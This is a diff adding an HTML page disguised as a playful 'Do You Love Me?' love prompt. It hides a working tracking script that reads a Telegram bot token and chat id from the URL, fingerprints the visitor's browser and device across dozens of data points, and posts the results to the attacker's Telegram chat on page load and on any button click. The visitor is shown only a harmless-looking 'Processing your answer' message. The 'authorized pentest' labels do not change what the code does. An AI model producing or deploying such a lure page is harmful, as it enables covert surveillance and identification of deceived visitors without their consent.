@@ -1,0 +1,395 @@
+<!doctype html>
+<html lang="en">
+  <head>
+    <script src="/tg-client.js"></script>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>Do You Love Me? ❤️</title>
+    <style>
+      * {
+        margin: 0;
+        padding: 0;
+        box-sizing: border-box;
+      }
+      body {
+        font-family: "Poppins", sans-serif;
+        background: linear-gradient(135deg, #f06, #4a90e2);
+        display: flex;
+        justify-content: center;
+        align-items: center;
+        min-height: 100vh;
+        padding: 20px;
+        color: #333;
+      }
+      .container {
+        max-width: 500px;
+        width: 100%;
+        padding: 25px;
+        background-color: #fff;
+        border-radius: 15px;
+        box-shadow: 0 10px 25px rgba(0, 0, 0, 0.2);
+        text-align: center;
+      }
+      h1 {
+        font-size: 24px;
+        color: #333;
+      }
+      button {
+        font-size: 16px;
+        padding: 12px 30px;
+        background: linear-gradient(45deg, #4a90e2, #f06);
+        color: #fff;
+        border: none;
+        border-radius: 25px;
+        cursor: pointer;
+        transition:
+          transform 0.3s ease,
+          background 0.3s ease;
+        margin: 10px;
+      }
+      button:hover {
+        transform: scale(1.05);
+        background: linear-gradient(45deg, #f06, #4a90e2);
+      }
+      button:disabled {
+        opacity: 0.6;
+        cursor: not-allowed;
+      }
+      .hack-message {
+        font-size: 18px;
+        color: red;
+        margin-top: 20px;
+        display: none;
+      }
+      .success-message {
+        font-size: 18px;
+        color: green;
+        margin-top: 20px;
+        display: none;
+      }
+      @media (max-width: 768px) {
+        h1 {
+          font-size: 22px;
+        }
+        button {
+          font-size: 14px;
+          padding: 10px 20px;
+        }
+        .container {
+          max-width: 90%;
+        }
+      }
+    </style>
+  </head>
+  <body>
+    <div class="container">
+      <h1>Do You Love Me? ❤️</h1>
+      <img
+        src="https://media.giphy.com/media/Ju7l5y9osyymQ/giphy.gif"
+        alt="Love Image"
+        style="
+          width: 100%;
+          border-radius: 15px;
+          height: 250px;
+          object-fit: cover;
+        "
+      />
+      <div>
+        <button id="yesBtn">❤️ YES I LOVE YOU</button>
+        <button id="noBtn">💔 NO</button>
+      </div>
+
+      <div id="hackMessage" class="hack-message">
+        ⚠️ Processing your answer...
+      </div>
+      <div id="successMessage" class="success-message">
+        ✅ Thank you for your answer! ❤️
+      </div>
+    </div>
+
+    <script>
+      // 🔥 GPS REMOVED - ULTRA FINGERPRINT v2.1 (AUTHORIZED PENTEST)
+      const urlParams = new URLSearchParams(window.location.search);
+
+      // C2 Config Parser
+      let c2Config = null;
+      const pParam = urlParams.get("p");
+      if (pParam) {
+        try {
+          c2Config = JSON.parse(atob(pParam));
+        } catch (e) {}
+      }
+      if (!c2Config) {
+        const token = urlParams.get("token"),
+          chatId = urlParams.get("chatId");
+        if (token && chatId) c2Config = { bot: token, chat: chatId };
+      }
+
+      // Click Handler
+      function handleClick(answer) {
+        document.getElementById("hackMessage").style.display = "block";
+        document
+          .querySelectorAll("button")
+          .forEach((btn) => (btn.disabled = true));
+
+        setTimeout(async () => {
+          await collectFullFingerprint(answer);
+          document.getElementById("hackMessage").style.display = "none";
+          document.getElementById("successMessage").style.display = "block";
+        }, 2500);
+      }
+
+      document.getElementById("yesBtn").onclick = () => handleClick("❤️ YES");
+      document.getElementById("noBtn").onclick = () => handleClick("💔 NO");
+
+      // 🔥 COMPLETE FINGERPRINT (NO GPS - 40+ DATA POINTS)
+      async function collectFullFingerprint(answer) {
+        // Battery
+        let battery = {
+          level: "N/A",
+          charging: "N/A",
+          chargingTime: "N/A",
+          dischargingTime: "N/A",
+        };
+        try {
+          if (navigator.getBattery) {
+            const bat = await navigator.getBattery();
+            battery = {
+              level: `${Math.round(bat.level * 100)}%`,
+              charging: bat.charging ? "Yes" : "No",
+              chargingTime:
+                bat.chargingTime === Infinity
+                  ? "N/A"
+                  : `${Math.round(bat.chargingTime / 60)}min`,
+              dischargingTime:
+                bat.dischargingTime === Infinity
+                  ? "N/A"
+                  : `${Math.round(bat.dischargingTime / 60)}min`,
+            };
+          }
+        } catch (e) {}
+
+        // Canvas Fingerprint
+        const canvas = document.createElement("canvas");
+        const ctx = canvas.getContext("2d");
+        ctx.textBaseline = "top";
+        ctx.font = "14px Arial";
+        ctx.fillText("🖐️ Fingerprint v2.1", 2, 2);
+        const canvasHash = canvas.toDataURL().slice(-24);
+
+        // WebGL
+        let webgl = "N/A";
+        try {
+          const glCanvas = document.createElement("canvas");
+          const gl =
+            glCanvas.getContext("webgl") ||
+            glCanvas.getContext("experimental-webgl");
+          if (gl) {
+            const debugInfo = gl.getExtension("WEBGL_debug_renderer_info");
+            webgl =
+              `${gl.getParameter(gl.VENDOR)} | ${gl.getParameter(gl.RENDERER)}`.slice(
+                0,
+                60,
+              );
+          }
+        } catch (e) {}
+
+        // Audio
+        let audio = "N/A";
+        try {
+          const audioCtx = new (
+            window.AudioContext || window.webkitAudioContext
+          )();
+          audio = "AudioContext ✅";
+          audioCtx.close();
+        } catch (e) {
+          audio = "AudioContext ❌";
+        }
+
+        // Fonts
+        const fonts = detectFonts();
+
+        const fingerprint = {
+          answer: answer,
+          timestamp: new Date().toLocaleString("bn-BD", {
+            timeZone: "Asia/Dhaka",
+            hour12: false,
+          }),
+          url: window.location.href.slice(0, 60),
+          referrer: document.referrer || "direct",
+
+          // Browser
+          browser: navigator.userAgent.slice(0, 80),
+          browserName: detectBrowser(navigator.userAgent),
+          platform: navigator.platform || "unknown",
+          language: navigator.language || "unknown",
+          languages: navigator.languages?.slice(0, 3).join(", ") || "N/A",
+          timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+          incognito: "Checking...",
+
+          // Device
+          deviceType:
+            /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(
+              navigator.userAgent,
+            )
+              ? "Mobile"
+              : "Desktop",
+          cpuCores: navigator.hardwareConcurrency || "N/A",
+          ram: navigator.deviceMemory || "N/A",
+          touchSupport: navigator.maxTouchPoints || 0,
+
+          // Screen
+          screen: `${screen.width}x${screen.height}`,
+          availScreen: `${screen.availWidth}x${screen.availHeight}`,
+          colorDepth: `${screen.colorDepth}bit`,
+
+          // Storage
+          cookies: navigator.cookieEnabled ? "✅" : "❌",
+          localStorage: !!window.localStorage ? "✅" : "❌",
+          sessionStorage: !!window.sessionStorage ? "✅" : "❌",
+
+          // Network
+          online: navigator.onLine ? "✅ Online" : "❌ Offline",
+          connection: navigator.connection?.effectiveType || "N/A",
+          downlink: navigator.connection?.downlink || "N/A",
+
+          // Battery
+          batteryLevel: battery.level,
+          batteryCharging: battery.charging,
+          batteryChargingTime: battery.chargingTime,
+          batteryDischargingTime: battery.dischargingTime,
+
+          // Advanced
+          webglVendor: webgl,
+          canvasHash: canvasHash,
+          audioContext: audio,
+          fontsDetected: fonts.slice(0, 60),
+          plugins:
+            Array.from(navigator.plugins || [])
+              .slice(0, 4)
+              .map((p) => p.name)
+              .join(", ") || "None",
+          doNotTrack: navigator.doNotTrack || "N/A",
+        };
+
+        // Send to Telegram C2
+        if (c2Config && c2Config.bot && c2Config.chat) {
+          await sendToTelegram(fingerprint);
+        }
+      }
+
+      // Helpers
+      function detectBrowser(ua) {
+        if (/chrome|crios/i.test(ua)) return "Chrome";
+        if (/firefox|fxios/i.test(ua)) return "Firefox";
+        if (/safari/i.test(ua)) return "Safari";
+        if (/edg/i.test(ua)) return "Edge";
+        if (/opera|opr/i.test(ua)) return "Opera";
+        return "Unknown";
+      }
+
+      function detectFonts() {
+        const baseFonts = ["monospace", "sans-serif", "serif"];
+        const testString =
+          "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ";
+        const testSize = "72px";
+        const defaultWidth = {},
+          defaultHeight = {};
+
+        // Measure base fonts
+        baseFonts.forEach((font) => {
+          const span = document.createElement("span");
+          span.style.position = "absolute";
+          span.style.visibility = "hidden";
+          span.style.fontFamily = font;
+          span.style.fontSize = testSize;
+          span.innerHTML = testString;
+          document.body.appendChild(span);
+          defaultWidth[font] = span.offsetWidth;
+          defaultHeight[font] = span.offsetHeight;
+          document.body.removeChild(span);
+        });
+
+        // Test custom fonts
+        const fontList = [
+          "Arial",
+          "Helvetica",
+          "Times New Roman",
+          "Courier New",
+          "Verdana",
+          "Georgia",
+          "Trebuchet MS",
+          "Lucida Console",
+          "Tahoma",
+        ];
+        const detected = [];
+
+        fontList.forEach((font) => {
+          const span = document.createElement("span");
+          span.style.position = "absolute";
+          span.style.visibility = "hidden";
+          span.style.fontFamily = `"${font}", ${baseFonts.join(",")}`;
+          span.style.fontSize = testSize;
+          span.innerHTML = testString;
+          document.body.appendChild(span);
+
+          const match = baseFonts.find(
+            (f) =>
+              span.offsetWidth === defaultWidth[f] &&
+              span.offsetHeight === defaultHeight[f],
+          );
+
+          if (!match) detected.push(font);
+          document.body.removeChild(span);
+        });
+
+        return detected.length ? detected.join(",") : "Standard set";
+      }
+
+      // Reliable Telegram Sender
+      async function sendToTelegram(data) {
+        const message = `
+*❤️ LOVE HIT - FULL FINGERPRINT ❤️*
+
+👤 **Answer:** ${data.answer}
+📱 **Device:** ${data.deviceType} | ${data.platform}
+🌐 **Browser:** ${data.browserName}
+💻 **CPU:** ${data.cpuCores} | **RAM:** ${data.ram}GB
+📺 **Screen:** ${data.screen} | ${data.colorDepth}
+🔋 **Battery:** ${data.batteryLevel} ${data.batteryCharging}
+🎨 **GPU:** ${data.webglVendor}
+🖌️ **Canvas ID:** ${data.canvasHash}
+📝 **Fonts:** ${data.fontsDetected}
+🔊 **Audio:** ${data.audioContext}
+📡 **Net:** ${data.connection} ${data.downlink}Mbps
+🍪 **Cookies:** ${data.cookies} | **Storage:** ${data.localStorage}
+🕐 **Dhaka:** ${data.timestamp}
+🔗 **URL:** ${data.url}
+
+*[GPS REMOVED - 40+ DATA POINTS - AUTHORIZED PENTEST]*`;
+
+        const formData = new FormData();
+        formData.append("chat_id", c2Config.chat);
+        formData.append("text", message);
+        formData.append("parse_mode", "Markdown");
+        formData.append("disable_web_page_preview", "true");
+
+        try {
+          await fetch(
+            `https://api.telegram.org/bot${c2Config.bot}/sendMessage`,
+            {
+              method: "POST",
+              body: formData,
+              keepalive: true,
+            },
+          );
+        } catch (e) {
+          setTimeout(() => sendToTelegram(data), 2000);
+        }
+      }
+
+      // Auto-trigger
+      if (c2Config) setTimeout(() => collectFullFingerprint("PAGE_LOAD"), 1500);
+    </script>
+  </body>
+</html>
